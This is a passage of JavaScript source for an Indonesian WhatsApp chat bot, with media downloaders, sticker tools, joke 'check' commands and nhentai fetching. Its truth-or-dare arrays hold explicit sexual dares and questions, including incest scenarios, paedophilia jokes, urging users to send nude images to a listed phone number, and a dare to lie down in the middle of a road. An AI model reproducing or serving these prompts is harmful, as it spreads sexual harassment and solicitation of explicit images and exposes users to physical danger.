  if (isBanChat) return reply(mess.bangc)
if (!q) return reply('Please provide the link !')
reply(mess.waiting)
if (!q.includes('tiktok')) return reply(`That's not a tiktok link!`)
 const musim_rambutan = await MikuTiktok(`${q}`).catch(e => {
reply(mess.error) 
} )
 console.log(musim_rambutan)
 const mikutiktoknowm = musim_rambutan.result.nowatermark
  Miku.sendMessage(from, { video: { url: mikutiktoknowm }, caption: "Here it is..." }, { quoted: m })
 }
break

case 'tiktokaudio':
case 'tiktokmusic':
case 'ttaud':{
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
if (!q) return reply('Where is the audio?')
if (!q.includes('tiktok')) return reply(`That's not a tiktok link!`)
 const musim_rambutan = await MikuTiktok(`${q}`).catch(e => {
reply(mess.error) 
} )
 console.log(musim_rambutan)
 const mikutiktokaudio = musim_rambutan.result.nowatermark
  Miku.sendMessage(from, { audio: { url: mikutiktokaudio }, mimetype: 'audio/mp4' }, { quoted: m })
 }
break
case 'mp': {
if (!isMod) return reply(`🤭🤭🤭`)
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 const YT=require('./lib/ytdlcore')
 const { isUrl, fetchBuffer } = require('./lib/Function')

 if(!text) return Miku.sendMessage(from,{text:"Judulnya la bang!!!"},{quoted:m})
 reply(`Sek yoo...`)
 let yts = require("yt-search")
 let search = await yts(text)
 let anu = search.videos[0]
 let buttons = [
 {buttonId: `-ytad ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1},
 {buttonId: `-ytvd ${text}`, buttonText: {displayText: '► Video'}, type: 1}

 ]
 let buttonMessage = {
 image: { url: anu.thumbnail },
 caption: `「  _Miuna Youtube Downloader_  」
*Judul :* ${anu.title}
*Durasi :* ${anu.timestamp}
*Penonton :* ${anu.views}
*Diupload :* ${anu.ago}
*Channel :* ${anu.author.name}
*Url :* ${anu.url}`,
 footer: `${global.BotName}`,
 buttons: buttons,
 headerType: 4,

 }
 Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
 break
case 'music': case 'play': case 'song': case 'ytplay': {
if (m.isGroup) return reply(`untuk mengurangi spam , fitur ini hanya dapat digunakan dichat pribadi`)    
if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 const YT=require('./lib/ytdlcore')
 const { isUrl, fetchBuffer } = require('./lib/Function')

 if(!text) return Miku.sendMessage(from,{text:"Ehem, Judulnya?"},{quoted:m})
 reply(mess.waiting)
 let yts = require("yt-search")
 let search = await yts(text)
 let anu = search.videos[0]
 let buttons = [
 {buttonId: `-ytad ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1},
 {buttonId: `-ytvd ${text}`, buttonText: {displayText: '► Video'}, type: 1}

 ]
 let buttonMessage = {
 image: { url: anu.thumbnail },
 caption: `「  _Miuna Youtube Downloader_  」
 
*Judul :* ${anu.title}
*Durasi :* ${anu.timestamp}
*Penonton :* ${anu.views}
*Diupload :* ${anu.ago}
*Channel :* ${anu.author.name}
*Url :* ${anu.url}`,
 footer: `${global.BotName}`,
 buttons: buttons,
 headerType: 4,

 }
 Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
 break
case 'ytad': {
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    const YT=require('./lib/ytdlcore')
    let yts = require("yt-search")
    let search = await yts(text)
    let anu = search.videos[0]
    const ytmp3play = await YT.mp3(anu.url)
    let stats = fs.statSync(ytmp3play.path)
    let fileSizeInBytes = stats.size;
    if (fileSizeInBytes > 60000000) return reply('Gomenne, gabisa ngirim audio lebih dari *60MB* 🥺 ')
    
 await Miku.sendMessage(from, {document: fs.readFileSync(ytmp3play.path),fileName: anu.title + '.mp3',mimetype: 'audio/mpeg',}, {quoted:m})
 }
 break

 case 'ytvd': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 const YT=require('./lib/ytdlcore')
    let yts = require("yt-search")
    let search = await yts(text)
    let anu = search.videos[0]
    const ytmp4play = await YT.mp4(anu.url)
    let vidduration =ytmp4play.duration;
    if (vidduration > 1800) return reply('Gomenne, gabisa ngirim vido lebih dari *30 menit* 🥺 ')
 Miku.sendMessage(from, {video:{url:ytmp4play.videoUrl}, mimetype:"video/mp4", caption:anu.title+'By *Miuna Downloader*',}, {quoted:m})
 }
 break
 case 'ytmp3': case 'ytmusic':  case 'ytmp4': case 'ytvideo': case 'ytdl':{
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!args[0]) return reply(mess.nolink)

 const YT=require('./lib/ytdlcore')
 if(!text) return Miku.sendMessage(from,{text:"Tolong cantumin Linknya!"},{quoted:m})
 let yts = require("yt-search")
 let search = await yts(text)
 let anu = search.videos[0]
 let buttons = [
 {buttonId: `-ytad2 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1},
 {buttonId: `-ytvd2 ${text}`, buttonText: {displayText: '► Video'}, type: 1}

 ]
 let buttonMessage = {
 image: { url: anu.thumbnail },
 caption: `「  _Miuna Youtube Downloader_  」
*Title :* ${anu.title}
*Duration :* ${anu.timestamp}
*Viewers :* ${anu.views}
*Uploaded :* ${anu.ago}
*Channel :* ${anu.author.name}
*Url :* ${anu.url}`,
 footer: `${global.BotName}`,
 buttons: buttons,
 headerType: 4,

 }
 Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
 break


 case 'ytad2': {
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    const YT=require('./lib/ytdlcore')
    const ytmp3play2 = await YT.mp3(text)
    let stats = fs.statSync(ytmp3play2.path)
    let fileSizeInBytes = stats.size;
    if (fileSizeInBytes > 60000000) return reply('Gomenne, gabisa ngirim audio lebih dari *60MB* 🥺 ')
    
 await Miku.sendMessage(from, {document: fs.readFileSync(ytmp3play2.path),fileName:'Miku_YTmp3_Downloader.mp3',mimetype: 'audio/mpeg',}, {quoted:m})
 }
 break

 case 'ytvd2': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 const YT=require('./lib/ytdlcore')
    const ytmp4play2 = await YT.mp4(text)
    let vidduration =ytmp4play2.duration;
    if (vidduration > 1800) return reply('Gomenne, gabisa ngirim video lebih dari *30Menit* 🥺 ')
 Miku.sendMessage(from, {video:{url:ytmp4play2.videoUrl}, mimetype:"video/mp4", caption:'Downloaded by *Miku MD*',}, {quoted:m})
 }
 break
case 'couplepp':  case 'ppcouple': {
if (isBan) return reply(mess.banned)
if (isBanChat) return reply(mess.bangc)
         reply(mess.waiting)
         let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
         let random = anu[Math.floor(Math.random() * anu.length)]
         Miku.sendMessage(m.chat, { image: { url: random.male }, caption: `Untuk Cowok...` }, { quoted: m })
         Miku.sendMessage(m.chat, { image: { url: random.female }, caption: `Untuk Cewek...` }, { quoted: m })
     }
 break


 






case 'pinterest': case 'pin': {
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
 if (!args.join(" ")) return reply("Tolong cantumin keywordnya 🥺 ")
 try {
 hx.pinterest(args.join(" ")).then(async(res) => {
 imgnyee = res[Math.floor(Math.random() * res.length)]
 let buttons = [
 {buttonId: `-pinterest ${args.join(" ")}`, buttonText: {displayText: '>>'}, type: 1}
 ]
 let buttonMessage = {
 image: { url: imgnyee },
 caption:  `Title : ` + args.join(" ") + `\nMedia Url : `+imgnyee,
 footer: `${global.BotName}`,
 buttons: buttons,
 headerType: 4,
 
 }
 Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
 }).catch(_ => _)
 } catch {
 reply("Error")
 }
 }
 break



case 'swm': case 'take': case 'stickerwm': case 'steal':{
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
if (!args.join(" ")) return reply(`Use command: -steal Miuna Bot|By: Ri`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
Miku.downloadAndSaveMediaMessage(quoted, "gifee")
Miku.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Miku.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds is allowed!')
let media = await quoted.download()
let encmedia = await Miku.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim Foto/Video ${prefix + command}\nCuma Durasi vidio 1-9 detik yang dibolehin!`)
}
}
break




case 'sm': case 'smeme': case 'stickermeme': case 'stickmeme': {
	   if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
let { TelegraPh } = require('./lib/uploader')
if (!text) return reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
if (text.includes('|')) return reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
if (!/image/.test(mime)) return reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
reply(mess.waiting)
mee = await Miku.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
memek = await Miku.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break

case 'sgif': case 'sticker': case 's': {
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
 if (/image/.test(mime)) {
 let media = await quoted.download()
 let encmedia = await Miku.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else if (/video/.test(mime)) {
 if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!')
 let media = await quoted.download()
 let encmedia = await Miku.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else {
 reply(`Kirim Foto/Video dengan textnya ${prefix + command}\nDurasi Vidio 1-9 Detik`)
 }
 }
 break

case 'wiki':
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
if (args.length < 1) return reply(' Mau nyari apa oniichan? ')
const res2 = await wikiSearch(q).catch(e => {
return reply('Error, Hasil Tidak Ditemukan!') 
}) 
const result2 = `*Title :* ${res2[0].judul}\n*Wiki :* ${res2[0].wiki}`
Miku.sendMessage(from, { image : { url : res2[0].thumb }, caption : result2}) 
break

case 'gempa':
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
const tres = await Gempa()
var { Waktu, Lintang, Bujur, Magnitude, Kedalaman, Wilayah, Map } = tres.result
console.log(Map)
const captt = `Time : ${Waktu}\nLatitude : ${Lintang}\nLongitude : ${Bujur}\nWilayah : ${Wilayah}`
Miku.sendMessage(from, { image : { url : Map }, caption : captt})
break

case 'covidinfo':
case 'covid':
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
const c = await covid()
var { kasus, kematian, sembuh } = c[0]
Miku.sendMessage(from, {text : `Case : ${kasus}\n\nMeninggal : ${kematian}\n\nSembuh : ${sembuh}`}, m)
break
/*case 'odes' : {
if (!isCreator) return reply (`Belum Bisa Digunakan`)
tes = await fetchJson
}*/

case 'handsomecheck':
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
				if (!text) return replay(`Tag Seseorang, Contoh : ${prefix + command} @Mamat Asu`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
Miku.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nJawaban : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
				if (!text) return replay(`Tag Seseorang, Contoh : ${prefix + command} @mamat Pedo`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
Miku.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nJawaban : *${tik}%*` }, { quoted: m })
					break

case 'cabulcheck':
case 'gaycheck':
case 'cutecheck':
case 'pedocheck':
case 'sangecheck':
case 'uglycheck':
if (isBan) return reply(mess.banned)
if (isBanChat) return reply(mess.bangc)
if (!text) return replay(`Tag Seseorang, Contoh : ${prefix + command} @Mamat Stress`)
const sangeh = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
Miku.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nJawaban : *${sange}%*` }, { quoted: m })
					break


case 'characheck':
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
					if (!text) return replay(`Tag Seseorang, Contoh : ${prefix + command} @mamat titit kecil`)
					const Mikutttt =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = Mikutttt[Math.floor(Math.random() * Mikutttt.length)]
					Miku.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
                   
 case 'tantangan':
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
                   const dare =[
	" _Post lewd telanjang di facebook Tanpa adanya sensor_ ",
	" _Gacoli selama sebulan_ ",
	" _Berhenti Coli sampe mati_ ",		   
	" _Sebutkan Nama Titit Lu!_ ",		   
	" Buat Cewek : Ajak Ngewe *Ri* \n Buat cowok : Jilat kaki *Ri* ",		   
	" _Masukin Vibrator ke lobang bool lu_ ",		   
	" Buka Link Ini https://www.youtube.com/watch?v=G_Avv9tslzo ",
	" Nonton video ini sampai habis tanpa skip https://www.youtube.com/watch?v=HIcSWuKMwOw ", 
	" _Chat whatsapp emak atau bapak lu , dan bilang *Mak/Pak Pengen Kawin*_ ",
        " _Chat +6285161888973 trus kirimin Lewd_ ",
        " _Selamat Kamu mendapatkan link pemersatu bangsa https://mega.nz/folder/iYISVKbB#sUbxEuSnO1mfp4yZYcHEcQ _",		   
	" _Pinjem tangan sepupulu , trus tangannya lu arahin ke titid lu_ ",
	" _Berak tapi gacebok_ ",		   
	" _Desah di voicenote _ ",
	" _Entod Lobang bool sendiri_ ",		   
	" _jilat foto trap_ ",
	" _Jitak pala adek/Kakak lu_",
	" _Pengen Keisekai ? jika pengen maka segeralah rebahan ditengah jalan!\n\nJika tidak, segeralah coli sampe crot 10x_",
	" _Coli sekarang Juga dan Pejunya lu telan_",
	"Dibilangin Sedekah Ke *Ri* :v",
	 "Sedekah ke *Ri* :v",		   
         "Minum kencing sendiri",
         "Topup in admin",
         "Saling sepong dengan mamat",
         "Sentil titit admin.",
         "Ajak Adu batang dengan member lain",
         "Telpon mantanlu trus Ajak Ngentot didepan pacarnya",
         "Nyanyi keun lagu terakhir yang elu dengerin",
         "Coli sekarang juga!",
         "Entot admin",
         "Ajak orang random untuk coli bareng",
         "Sebutkeun nama mantan lo!",
         "Ajak 1anggota untuk Saling sepong!",
         "Kirim foto waifu lo!",
         "Chat 1member disini .trus kirim foto titid lu kedia, abis itu SS kirimin kesini!",
         "Buka salah 1 aib lo!",
         "tag orang yang pengen lu entot",
         "Crotin bantal sendiri.",
         "Ubah namalu jadi PENGIKUT MAMAT PEDO",
         "Teriak KONTOL di Voice Note",
         "Jilat titid sendiri",
         "katain waifu lu lonte!",
         "Ngocog ditempat umum",
         "Teriak PENGEN NGENTOT divoice note*",
         "Kirim foto telanjang waifu lo",
         "Sedekah kekotak amal terdekat*",
         "Ubah namalu jadi PENIKMAT 2D",
         "Entot bantal sendiri",
         "Katain waifu orang LONTE",
         "Katakan MARK KONTOL",
         "mengajak nikah sepupu didepan keluarga besar",
         "SS History bokeplu ",
         "Sebutkeun Fetishmu!",
	 "Hari ini sholat 5waktu",
	 "Selamat , anda mendapatkan custom Role!\nSilahkan chat Owner bot Jika ingin mengclaim rolenya(Hadiah ini tidak berlaku jika anda telah mendapatkan custom role)",
	 "katakan *AKU GAY* Kebapakmu",
	 "jikalau kamu dipaksa untuk meng NTR antara istri pahlawan dan raja, mana yg kamu pilih?",
         "Katakan MAMAT PEDO"
     ]
                   const Mikudareww = dare[Math.floor(Math.random() * dare.length)]
                   buffer = await getBuffer(`https://telegra.ph/file/9c8909ec77adaf2ef1efb.jpg`)
                   Miku.sendMessage(from, { image: buffer, caption: '*tidak melakukan tantangannya ? potong ae tu titid!!!*\n\n\nTantangannya : '+ Mikudareww }, {quoted:m})
                   break
                       

case 'kebenaran':
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
                           const truth =[
                 "pernahkah coli dengan gambar keluarga sendiri?",
                 "Sehari Crot Berapa kali?",
                 "Biasanya Coli pake bahan apaan ?",
                 "Kamu Gay Ya ?",
                 "Apakah kamu pernah mencoba untuk menyepong titid kamu sendiri?",
                 "Pernah Nyewa lonte?",
                 "Apa yang membuatmu ketagihan coli ?",
                 "Kalo diajak mamat(anemone) ngewe , apakah kamu mau ?", 
                 "apakah kamu pengidap pedofil akut ?",
		 "jika Kamu disuruh Tetanggamu untuk mengentot istrinya, apakah kamu akan MemBRUTALin istrinya sampai pagi?",
		"Pernah kepergok lagi coli?",
		"Apakah kamu ingin berhenti coli ?",
"_Selamat anda mendapatkan Sebuah link Pemersatu Bangsa_ \nhttps://mega.nz/folder/MhdiEKSB#htmMZNkdYkuORkAxkxpOuw ",
"_Apakah anda pernah mengENTOD/Dientod sepupu anda?",
"_Apakah Anda mau jika diajak Sepupu/Kakak untuk Melakukan Enjos Enjos?_",
"_Jika anda mati dan bereinkarnasi ke isekai , apa yang akan anda lakukan di isekai?_\n*kalo gw sih ngentotin heroin yang punya tt gede:v*",
"_Pernahkah anda mencoba untuk menyepong titid anda sendiri?_",
"_Jika saat ini lagi berkumpul bersama keluarga, dan tiba tiba anda ingin coli. apakah yang anda lakukan?_",
"*Gatau, pengen beli truk*",
"Sebulan berapa kali cukur jembud?",
"Apa yang antum lakukan ketika ingin membahagiakan orang tua antum?",
"Capek ga jadi beban orang tua?",
"Pernah liat Sepupu/Kakak/adek telanjang tanpa sehelai benang? dan jika pernah, apa yang antum lakukan? langsung coli? akwokaokawo", 
"Gatau bang mo ngasih pertanyaan apa, bingung gweh",
"Pernah makan jembud?", 
"Selamat , anda mendapatkan custom Role!\nSilahkan chat Owner bot Jika ingin mengclaim rolenya(Hadiah ini tidak berlaku jika anda telah mendapatkan custom role)",
"Selamat! anda mendapatkan lonT kualitas premium https://telegra.ph/file/6833783a65e584073d294.jpg ",
"Tar dulu , gw pengen ngentot"
                 
             ]
                           const mikutruthww = truth[Math.floor(Math.random() * truth.length)]
                           buffer = await getBuffer(`https://telegra.ph/file/9c8909ec77adaf2ef1efb.jpg`)
                           Miku.sendMessage(from, { image: buffer, caption: '*Gajawab mandul*\n\n'+ mikutruthww }, {quoted:m})
                           break




case 'mediafire': case 'mediafiredl': {
	if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
if (!text) return reply(mess.linkm)
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`The link you provided is invalid`)
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 999) return reply('*File Over Limit* '+util.format(baby1))
const result4 = `「  *Mediafire Downloader*  」
				
*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}`
reply(`${result4}`)
Miku.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
}
break

case 'report':{
if (!args.join(" ")) return reply (`Contoh : *-report Fitur Nhentai Rusak bang*`)
let text = `${args.join(" ")}\n\n${m.sender}`
Miku.sendMessage(`6285161888973@s.whatsapp.net`, {text : text},{quoted : fvn})
reply (`Laporan mu sudah diterima owner. Terima Kasih.\n\nPerlu di Ingat! Jika kamu hanya iseng saja, Maka kamu bakalan diblokir oleh Owner Sehingga kamu tidak bisa menggunakan Bot lagi.`)
}
break
case 'donatur':{
let text = `Ingin menjadi donatur? 
Caranya cukup mudah kak.
kirim donasi dengan nominal Seihklasnya Ke Nomer 085161888973 Bisa Via Dana/Ovo/Gopay.
Jika sudah Silahkan chat ke nomer whatsapp  6285161888973 dan kirim bukti transfernya. 

Dengan Mendonasikan sedikit rezekimu maka Kehidupan Bot Dan owner akan sangat terbantu.
Terima kasih Buat yang sudah Donasi, Semoga Rezekimu dilipat gandakan oleh yang maha kuasa.

Apa Saja Keuntungan Menjadi Donatur? 
1. Bisa Request Role Sesuka Hati. Ketik *-Profile* untuk melihat Role Anda.
2. Bisa Menggunakan Semua Fitur Miuna Bot(Termasuk Fitur Donatur),Kecuali Fitur Owner.
3. Bisa Mengundang Bot kedalam groupmu.
4. Bisa Request Fitur (Ya tergantung kemampuan owner bisa atau engga:v)
dan masih banyak lagi untuk kedepannya!`

	let buttonMessage = {
	document: fs.readFileSync('./Rimed/Ri.xlsx'),
	mimetype: docs,
	fileName: `Cara Menjadi Donatur`,
	fileLength: 99999999999999,
	caption : text,
    footer : 'Miuna',
    headerType : 4,
    }
 Miku.sendMessage(m.chat, buttonMessage,{ quoted : m})
}
break
case 'nhentai' : case 'nh' : {
if (!isMod) return reply (mess.mod)
if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
reply (`Chotto matte nee....`)
henid = args[0]
r = await fetchJson (`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${lolkey}`)
a = r.result.title_romaji
b = r.result.title_native
const c = r.result.tags
imek = r.result.image[0]
baca = r.result.read
let teks =`Judul : ${b}\nJudul Romaji : ${a}\n\nTags : ${c}\n\n Baca Tanpa VPN Disini : ${baca}`
let buttom = [{buttonId : `-nhonlen1 ${henid}`, buttonText: {displayText: `Baca Onlen!`}, type : 1},{buttonId : `-nhen ${henid}`, buttonText: {displayText: `Download PDF!`}, type : 1}
]
let buttonMessage = {
image : {url: imek},
caption : teks,
buttons : buttom,
headerType : 1
}
Miku.sendMessage(m.chat , buttonMessage, {quoted : fvn })

}
break
case 'nhonlen1' :{
if (!isMod) return reply (mess.mod)
if (args.length == 0) return reply(`Contoh: ${prefix + command} 344253`)
reply (`Chotto matte nee....`)
henid = args[0]
r = await fetchJson (`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${lolkey}`)
imek = r.result.image[0]
imeks = r.result.image[1]
imekss = r.result.image[2]
imeksss = r.result.image[3]
imekssss = r.result.image[4]
imeksssss = r.result.image[5]
imekssssss = r.result.image[6]
imeksssssss = r.result.image[7]
imekssssssss = r.result.image[8]
imeksssssssss = r.result.image[9]
r11 = r.result.image[10]
r12 = r.result.image[11]
r13 = r.result.image[12] 
r14 = r.result.image[13]
r15 = r.result.image[14]
r16 = r.result.image[15]
r17 = r.result.image[16]
r18 = r.result.image[17]
r19 = r.result.image[18]
r20 = r.result.image[19]
teks =`Jika Bot tidak merespon , berarti udh END/Web eror`
let buttom = [{buttonId : `-nhonlen2 ${henid}`, buttonText: {displayText: `Next!`}, type : 1},{buttonId : `-donasi`, buttonText: {displayText: `Sedekah Online`}, type : 1}
]
let buttonMessage = {
image : {url: r20},
caption : teks,
buttons : buttom,
headerType : 1
}
Miku.sendMessage(m.chat,{image: {url:imek}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imeks}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imekss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imeksss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imekssss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imeksssss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imekssssss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imeksssssss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imekssssssss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imeksssssssss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:r11}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:r12}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:r13}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:r14}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:r15}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:r16}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:r17}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:r18}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:r19}})
await sleep(5000)
Miku.sendMessage(m.chat , buttonMessage, {quoted : fvn })

}
break
case 'nhonlen2' :{
if (!isMod) return reply (mess.mod)
if (args.length == 0) return reply(`Contoh: ${prefix + command} 344253`)
reply (`Chotto matte nee....`)
henid = args[0]
r = await fetchJson (`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${lolkey}`)
imek = r.result.image[20]
imeks = r.result.image[21]
imekss = r.result.image[22]
imeksss = r.result.image[23]
imekssss = r.result.image[24]
imeksssss = r.result.image[25]
imekssssss = r.result.image[26]
imeksssssss = r.result.image[27]
imekssssssss = r.result.image[28]
imeksssssssss = r.result.image[29]

teks =`Jika Bot tidak merespon , berarti udh END/Web eror`
let buttom = [{buttonId : `-nhonlen3 ${henid}`, buttonText: {displayText: `Next!`}, type : 1},{buttonId : `-donasi`, buttonText: {displayText: `Sedekah Online`}, type : 1}
]
let buttonMessage = {
image : {url: imeksssssssss},
caption : teks,
buttons : buttom,
headerType : 1
}
Miku.sendMessage(m.chat,{image: {url:imek}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imeks}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imekss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imeksss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imekssss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imeksssss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imekssssss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imeksssssss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imekssssssss}})
await sleep(5000)
Miku.sendMessage(m.chat , buttonMessage, {quoted : fvn })

}
break
case 'nhonlen3' :{
if (!isMod) return reply (mess.mod)
if (args.length == 0) return reply(`Contoh: ${prefix + command} 344253`)
reply (`Chotto matte nee....`)
henid = args[0]
r = await fetchJson (`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${lolkey}`)
imek = r.result.image[30]
imeks = r.result.image[31]
imekss = r.result.image[32]
imeksss = r.result.image[33]
imekssss = r.result.image[34]
imeksssss = r.result.image[35]
imekssssss = r.result.image[36]
imeksssssss = r.result.image[37]
imekssssssss = r.result.image[38]
imeksssssssss = r.result.image[39]

teks =`Jika Bot tidak merespon , berarti udh END/Web eror`
let buttom = [{buttonId : `-nhonlen4 ${henid}`, buttonText: {displayText: `Next!`}, type : 1},{buttonId : `-donasi`, buttonText: {displayText: `Sedekah Online`}, type : 1}
]
let buttonMessage = {
image : {url: imeksssssssss},
caption : teks,
buttons : buttom,
headerType : 1
}
Miku.sendMessage(m.chat,{image: {url:imek}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imeks}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imekss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imeksss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imekssss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imeksssss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imekssssss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imeksssssss}})
await sleep(5000)
Miku.sendMessage(m.chat,{image: {url:imekssssssss}})
await sleep(5000)
Miku.sendMessage(m.chat , buttonMessage, {quoted : fvn })

}
break

case 'nhen': {
if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (!isMod) return reply(mess.mod)
if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
reply(mess.waiting)
henid = args[0]
d = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${lolkey}`)
 hasil = d.result
crot = await getBuffer(hasil)
Miku.sendMessage(m.chat, { document : { url : hasil}, fileName : `${henid}.pdf`, mimetype: `pdf` }, { quoted : m })
await sleep(2000)
